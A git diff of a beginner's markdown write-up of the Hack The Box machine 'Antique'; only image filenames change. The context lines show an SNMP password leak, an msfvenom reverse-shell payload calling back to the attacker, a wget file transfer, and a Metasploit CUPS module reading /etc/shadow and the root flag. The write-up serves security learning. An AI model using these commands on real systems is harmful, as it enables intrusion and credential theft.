@@ -8,7 +8,7 @@ I am a beginner at penetration testing, so I will be referencing the Official Ha
 
 From the tags, I am able to notice that this machine is about printer exploitation on Linux:
 
-![](<../../.gitbook/assets/image (341) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (341) (1) (1) (1) (1) (1) (1) (1).png>)
 
 A basic nmap scan shows that only telnet is online:
 
@@ -16,7 +16,7 @@ A basic nmap scan shows that only telnet is online:
 
 Trying to telnet into the system, it asks for a password:
 
-![](<../../.gitbook/assets/image (348) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (348) (1) (1) (1) (1) (1).png>)
 
 I also had a deeper nmap scan running: `nmap -A -T4 -p- 10.10.11.107 -oN antique.nmap`
 
@@ -70,7 +70,7 @@ Nmap done: 1 IP address (1 host up) scanned in 626.36 seconds
 
 This nmap scan came back with pretty much the same information. I then viewed the walk-through to see where I had messed up. I learned about a tool called **snmpwalk**. In the walk-through, the author runs `snmpwalk -v 2c -c public 10.10.11.107`, which gets the following output:
 
-![](<../../.gitbook/assets/image (332) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (332) (1) (1) (1) (1).png>)
 
 I had actually had found the password for telnet on my own, but I was unable to decode it:
 
@@ -78,7 +78,7 @@ I had actually had found the password for telnet on my own, but I was unable to 
 
 I use **snmpget**, while the walk-through used **snmpwalk**. In the walk-through they used **binascii** (python import) in order to decode the bytes. I wanted to find a solution that was a bit more basic. I ended up using [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html) to convert the bytes from hex to ascii:
 
-![](<../../.gitbook/assets/image (346) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (346) (1) (1) (1) (1) (1).png>)
 
 The password seems to be: **P@ssw0rd@123!!123** I was in!
 
@@ -92,11 +92,11 @@ I noticed the write-up use python for the reverse shell. I then used [https://gi
 
 ![](<../../.gitbook/assets/image (349) (1) (1) (1) (1).png>)
 
-![](<../../.gitbook/assets/image (350) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (350) (1) (1) (1) (1) (1) (1).png>)
 
 I viewed the walk-through again to see what I missed. The walk-through author runs the netstat command to see what connections are there:
 
-![](<../../.gitbook/assets/image (345) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (345) (1) (1) (1) (1) (1).png>)
 
 They then go on to say that we should use **chisel** to connect to the port. I ran into an issue here where I was unable to download a GitHub repository onto the machine itself. I then realize that you make the binary locally and then upload it to the server. I uploaded the file to the machine by running `python3 -m http.server` on the folder where chisel was downloaded. I was then able to upload it by running `wget http://10.10.14.10:8000/chisel` on the remote machine. When I uploaded the file, I was unable to run it due to some dependency error in terms of version of libc:
 
@@ -108,7 +108,7 @@ They then go on to say that we should use **chisel** to connect to the port. I r
 
 When we search for cups on metasploit we get the following:
 
-![](<../../.gitbook/assets/image (338) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (338) (1) (1) (1) (1) (1).png>)
 
 We first make a shell file to upload to the server. To do this, the walk-through mentioned previously mentions `msfvenom -p linux/x64/meterpreter/reverse`_`tcp LHOST=<`_`YOUR-IP> LPORT=1337 --format elf > shell`. This will make the **shell** file in your directory. To move it to the remote machine, you can use the python http.server command mentioned previously. Before I ran the shell executable, I ran the following commands in Metasploit (based off of [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/)):
 
@@ -122,7 +122,7 @@ run
 
 After I ran the **run** command, I then switched to the remote machine and ran the shell executable (run `chmod +x shell` to make it executable). This gave me a connection in Metasploit:
 
-![](<../../.gitbook/assets/image (347) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (347) (1) (1) (1) (1) (1).png>)
 
 I then ran the following commands to look for the cups post exploitation program:
 
@@ -130,11 +130,11 @@ I then ran the following commands to look for the cups post exploitation program
 
 I then hit run and got an output:
 
-![](<../../.gitbook/assets/image (344) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (344) (1) (1) (1) (1).png>)
 
 Opening that file shows the output of /etc/shadow:
 
-![](<../../.gitbook/assets/image (342) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (342) (1) (1) (1) (1).png>)
 
 Since we want to get the output of /root/root.txt, I changed my option in metasploit to that:
 
@@ -142,4 +142,4 @@ Since we want to get the output of /root/root.txt, I changed my option in metasp
 
 Reading that file got me the root flag:
 
-![](<../../.gitbook/assets/image (340) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (340) (1) (1) (1) (1) (1) (1).png>)
